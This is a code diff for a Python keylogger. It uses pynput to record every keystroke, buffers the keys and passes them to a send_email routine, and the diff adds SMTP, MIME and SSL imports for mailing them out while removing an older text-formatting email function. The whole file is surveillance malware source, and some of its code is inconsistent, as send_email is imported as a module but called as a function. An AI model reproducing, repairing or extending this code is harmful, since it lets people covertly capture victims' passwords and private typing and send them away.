@@ -1,5 +1,10 @@
 import pynput
 from pynput.keyboard import Key, Listener
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import ssl
+import os
 import send_email
 
 count = 0
@@ -17,22 +22,9 @@ def on_press(key):
         send_email(message)
         keys = []  # Reset the list of keys after sending
 
-def email(keys):
-    message = ""
-    for key in keys:
-        k = key.replace("'","")
-        if key == "Key.space":
-            k = " " 
-        elif key.find("Key")>0:
-            k = ""
-        message += k
-    print(message)
-    email.sendEmail(message)
-
 def on_release(key):
     if key == Key.esc:
-        return False
+        return False  # Stop listener
 
-
-with Listener(on_press = on_press, on_release = on_release) as listener:
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
